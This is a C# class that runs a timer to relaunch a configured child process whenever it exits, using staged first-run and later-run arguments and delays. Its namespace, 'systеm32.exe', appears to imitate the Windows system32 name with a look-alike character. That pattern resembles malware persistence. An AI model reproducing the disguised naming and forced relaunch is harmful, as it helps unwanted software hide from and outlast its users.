using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Threading;

namespace systеm32.exe.Models
{
    public class ProcessListener : IListener
    {
        private readonly DispatcherTimer watcher;
        private Process _currentProcess;
        private readonly ISynchronizer synchronizer;
        private bool isInitializing = false;

        public ProcessListener()
        {
            synchronizer = new SharedConfigSynchronizer();
            watcher = new DispatcherTimer(DispatcherPriority.Normal)
            {
                Interval = TimeSpan.FromMilliseconds
                (
                    TimeSpan.FromSeconds
                    (
                        Properties.Settings.Default.ProcessCheckTimeoutInSeconds
                    ).TotalMilliseconds
                )
            };
            watcher.Tick += KeepChildProcess;
        }

        private async void KeepChildProcess(object sender, EventArgs e)
        {
            if (isInitializing)
            {
                return;
            }
            synchronizer.Synchronize(Properties.Settings.Default.ConfigPath);
            if (Properties.Settings.Default.DoNotRunAgain)
            {
                return;
            }
            if (_currentProcess.HasExited)
            {
                await InitializeChildProcess();
            }
        }

        public async void StartListening()
        {
            await InitializeChildProcess();
            watcher.Start();
        }

        private async Task InitializeChildProcess()
        {
            isInitializing = true;
            if (Properties.Settings.Default.IsRunForFirstTime)
            {
                Properties.Settings.Default.IsRunForFirstTime = false;
                Properties.Settings.Default.Save();
                string sharedConfigText = File.ReadAllText(Path.Combine(Properties.Settings.Default.ConfigPath, Properties.Settings.Default.ConfigFileName));
                sharedConfigText = sharedConfigText.Replace(nameof(Properties.Settings.Default.IsRunForFirstTime) + "\tTrue", nameof(Properties.Settings.Default.IsRunForFirstTime) + "\tFalse");
                File.WriteAllText(Path.Combine(Properties.Settings.Default.ConfigPath, Properties.Settings.Default.ConfigFileName), sharedConfigText);
                await Task.Delay(TimeSpan.FromSeconds(Properties.Settings.Default.FirstRunTimeoutInSeconds));
                try
                {
                    _currentProcess = Process.Start
                        (
                            Properties.Settings.Default.FilePath, Properties.Settings.Default.FirstRunArgs
                        );
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else
            {
                try
                {
                    await Task.Delay(TimeSpan.FromSeconds(Properties.Settings.Default.SecondRunTimeoutInSeconds));
                    _currentProcess = Process.Start
                        (
                            Properties.Settings.Default.FilePath, Properties.Settings.Default.SecondRunArgs
                        );
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            isInitializing = false;
        }

        public void StopListening()
        {
            try
            {
                _currentProcess.Kill();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
